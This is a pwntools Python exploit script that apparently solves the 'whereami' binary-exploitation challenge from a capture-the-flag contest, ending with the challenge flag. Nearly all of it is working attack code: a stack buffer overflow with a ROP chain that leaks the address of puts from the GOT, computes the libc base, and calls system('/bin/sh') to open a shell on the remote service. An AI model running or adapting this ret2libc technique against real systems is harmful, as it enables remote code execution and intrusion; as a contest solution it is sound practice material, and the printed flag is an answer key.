#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template whereami
from pwn import *

HOST, PORT = "challs.actf.co 31222".split()

# Set up pwntools for the correct architecture
exe = context.binary = ELF('whereami')
libc = ELF('./libc.so') if args.REMOTE else ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)

def generate_rop(chain: list) -> bytes:
    return b"".join(
        p64(_) for _ in chain
    )

io = start()

ret                 = 0x40101a # ret;
pop_rdi             = 0x401303 # pop rdi; ret; 
main_after_counter  = 0x401266

chain = [
    pop_rdi, exe.got.puts,
    exe.plt.puts,
    main_after_counter
]
rop = generate_rop(chain)

offset = 0x40
payload = b""
payload += cyclic_gen().get(offset)
payload += p64(0x404900)
payload += rop

io.sendlineafter(b"you? ", payload)

io.recvuntil(b"too.\n")
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts
log.success(f"libc @ {hex(libc.address)}")

one_gadgets = [
    0xcbdb1,
    0xcbdb4,
    0xcbdb7
]
one_gadget = one_gadgets[int(args.O1, 10) if args.O1 else 0]

chain = [
    ret,
    pop_rdi, next(libc.search(b"/bin/sh")),
    libc.sym.system,
]
rop = generate_rop(chain)

offset = 0x40
payload = b""
payload += cyclic_gen().get(offset)
payload += p64(0x404200)
payload += rop
io.sendline(payload)

io.interactive()

# actf{i'd_be_saf3_and_w4rm_if_1_wa5_in_la_5ca5e33ff06f}
